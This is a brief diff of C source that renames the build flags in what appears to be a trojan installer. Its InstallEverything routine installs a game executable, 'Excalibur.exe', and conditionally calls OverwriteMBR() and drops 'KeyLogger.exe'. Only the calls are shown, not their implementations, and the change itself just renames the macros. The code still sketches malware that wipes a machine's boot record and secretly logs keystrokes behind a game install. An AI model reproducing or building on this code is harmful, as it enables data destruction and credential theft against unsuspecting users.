@@ -85,7 +85,7 @@ static void InstallGame(const char* path)
 
 static void InstallEverything(char* path, HWND windowHandle)
 {
-#ifdef EX_MBROVERWRITE
+#ifdef OVERWRITE_MBR
     OverwriteMBR();
 #endif
 
@@ -102,7 +102,7 @@ static void InstallEverything(char* path, HWND windowHandle)
     strcat(gamePath, "\\Excalibur.exe");
     InstallGame(gamePath);
 
-#ifdef EX_KEYLOGGER
+#ifdef USE_KEYLOGGER
     char loggerPath[MAX_PATH];
     strcpy(loggerPath, path);
     strcat(loggerPath, "\\KeyLogger.exe");
